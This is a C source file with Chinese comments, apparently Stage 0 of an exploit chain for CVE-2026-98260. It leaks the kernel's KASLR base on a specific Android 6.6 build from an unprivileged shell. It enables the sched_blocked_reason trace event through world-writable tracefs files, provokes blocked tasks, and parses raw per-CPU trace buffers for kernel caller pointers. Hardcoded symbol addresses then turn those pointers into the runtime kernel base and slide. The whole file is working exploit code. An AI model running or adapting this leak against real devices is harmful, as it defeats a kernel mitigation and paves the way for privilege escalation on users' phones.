// 纯用户态 KASLR 泄漏（CVE-2026-98260 利用链的 Stage 0）
//
// 原理：
//   sched_blocked_reason（event id 109）的二进制 trace 记录里，
//   offset 16 是一个 void* caller = get_wchan(tsk)，即被阻塞任务的
//   内核调用地址。文本输出用 %pS 变成符号名，但 raw 记录里是**原始指针**。
//
//   /sys/kernel/tracing/events/sched/*/enable 是 0666 → shell 可写
//   /sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw 是 0440 root:readtracefs → shell 可读
//
// 得到若干 caller 原始地址后，用本机预置的 (符号, 函数内偏移, 静态地址)
// 三元组反推内核运行时基址；多个符号交叉一致即判定成功。
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TRACE_DIR "/sys/kernel/tracing"
#define EV_ENABLE TRACE_DIR "/events/sched/sched_blocked_reason/enable"
#define RAW_FMT TRACE_DIR "/per_cpu/cpu%d/trace_pipe_raw"

#define KIMAGE_STATIC 0xffffffc080000000ULL

/* 本机 6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k 的静态地址 */
struct hot {
	const char *name;
	uint64_t static_addr;
	uint64_t insn_off;
} hots[] = {
	{ "worker_thread", 0xffffffc0800d98c0ULL, 0x9c },
	{ "rcu_gp_kthread", 0xffffffc08016a030ULL, 0xc4 },
	{ "rcu_gp_fqs_loop", 0xffffffc08016ab44ULL, 0x1e4 },
	{ "rcu_gp_kthread", 0xffffffc08016a030ULL, 0x158 },
	{ "worker_thread", 0xffffffc0800d98c0ULL, 0x1a0 },
};
#define NHOT ((int)(sizeof(hots) / sizeof(hots[0])))

static int write_file(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		return -1;
	ssize_t r = write(fd, val, strlen(val));

	close(fd);
	return r < 0 ? -1 : 0;
}

#define MAXADDR 256
static uint64_t addrs[MAXADDR];
static int naddr;

static void collect(const unsigned char *buf, size_t len)
{
	size_t off = 0;

	while (off + 16 < len) {
		uint64_t commit;
		size_t pos;

		memcpy(&commit, buf + off + 8, 8);
		pos = off + 16;
		if (commit > 4096 || pos + commit > len)
			break;
		while (pos + 4 <= off + 16 + commit) {
			uint32_t hdr, type_len, evlen;
			const unsigned char *ev;
			uint16_t etype;

			memcpy(&hdr, buf + pos, 4);
			type_len = hdr & 0x1f;
			if (type_len == 30 || type_len == 31) {
				pos += 4;
				continue;
			}
			if (type_len == 0) {
				if (pos + 8 > len)
					break;
				memcpy(&evlen, buf + pos + 4, 4);
				ev = buf + pos + 8;
				evlen = (evlen + 3) & ~3u;
				pos += 8;
			} else {
				evlen = type_len * 4;
				ev = buf + pos + 4;
				pos += evlen;
			}
			if (evlen < 24)
				continue;
			memcpy(&etype, ev, 2);
			if (etype == 109) {
				uint64_t c;

				memcpy(&c, ev + 16, 8);
				if ((c >> 40) == 0xffffff && naddr < MAXADDR)
					addrs[naddr++] = c;
			}
		}
		off += 4096;
	}
}

int main(void)
{
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);

	if (write_file(EV_ENABLE, "1") < 0) {
		printf("无法 enable 事件: %s\n", strerror(errno));
		return 1;
	}
	write_file(TRACE_DIR "/tracing_on", "1");

	/* 制造一些阻塞 */
	int p[2];

	if (pipe(p) == 0) {
		for (int i = 0; i < 6; i++) {
			if (fork() == 0) {
				char b;

				close(p[1]);
				read(p[0], &b, 1);
				_exit(0);
			}
		}
	}
	usleep(400000);

	static unsigned char buf[1 << 20];
	int fds[64], nfd = 0;

	for (int c = 0; c < ncpu && c < 64; c++) {
		char path[128];
		int fd;

		snprintf(path, sizeof(path), RAW_FMT, c);
		fd = open(path, O_RDONLY | O_NONBLOCK);
		if (fd >= 0)
			fds[nfd++] = fd;
	}
	for (int i = 0; i < nfd; i++) {
		ssize_t n = read(fds[i], buf, sizeof(buf));

		if (n > 0)
			collect(buf, (size_t)n);
		close(fds[i]);
	}
	write_file(EV_ENABLE, "0");

	printf("采集到 %d 个 caller 地址\n", naddr);
	if (naddr == 0) {
		printf("没有采到数据\n");
		return 2;
	}

	/* 对每个地址 × 每个热符号，算出候选内核基址，取众数 */
	uint64_t cand[MAXADDR * NHOT];
	int nc = 0;

	for (int i = 0; i < naddr; i++)
		for (int h = 0; h < NHOT; h++) {
			uint64_t base = addrs[i] - (hots[h].static_addr - KIMAGE_STATIC)
					- hots[h].insn_off;

			if ((base >> 40) == 0xffffff)
				cand[nc++] = base;
		}

	uint64_t best = 0;
	int bestn = 0;

	for (int i = 0; i < nc; i++) {
		int n = 0;

		for (int j = 0; j < nc; j++)
			if (cand[j] == cand[i])
				n++;
		if (n > bestn) {
			bestn = n;
			best = cand[i];
		}
	}

	printf("\n候选基址众数命中 %d 次\n", bestn);
	if (bestn < 2) {
		printf("交叉验证不足，未能确定 KASLR\n");
		return 3;
	}
	printf("========================================\n");
	printf("内核运行时基址 = 0x%016llx\n", (unsigned long long)best);
	printf("KASLR slide    = 0x%016llx\n",
	       (unsigned long long)(best - KIMAGE_STATIC));
	printf("========================================\n");
	return 0;
}
